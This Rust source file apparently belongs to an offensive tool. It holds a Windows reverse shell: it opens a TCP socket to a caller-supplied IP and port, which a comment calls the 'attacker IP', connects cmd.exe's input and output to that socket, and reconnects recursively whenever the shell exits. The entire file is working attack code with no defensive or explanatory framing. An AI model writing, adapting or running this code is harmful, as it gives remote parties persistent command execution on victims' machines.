use std::net::{TcpStream, SocketAddr};
use std::process::{Command, Stdio};
use std::{thread, time};

extern crate socket2;

use self::socket2::{Socket, Domain, Type};




// Windows based imports
use std::os::windows::io::{FromRawSocket, IntoRawSocket};
use std::os::windows::io::{FromRawHandle, AsRawHandle};

pub fn shell(ip: String, port: String) {
    // ET, Phone Home!
    let home = [ip, port].join(":");

    sh(home)

}

fn sh(home: String){

        // create a TCP listener bound to two addresses
        let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();

        // Connect back to attacker IP
        socket.connect(&home.parse::<SocketAddr>().unwrap().into());

        let s = socket.into_tcp_stream();

        let sock = s.into_raw_socket();

        // Open shell
        Command::new("cmd")
            .stdin( Stdio::from_raw_handle(sock))
            .stdout( Stdio::from_raw_handle(sock))
            .stderr( Stdio::from_raw_handle(sock))
            .spawn()
            .unwrap()
            .wait()
            .unwrap();


    // println!("Shell exited");
    sh(home);

}
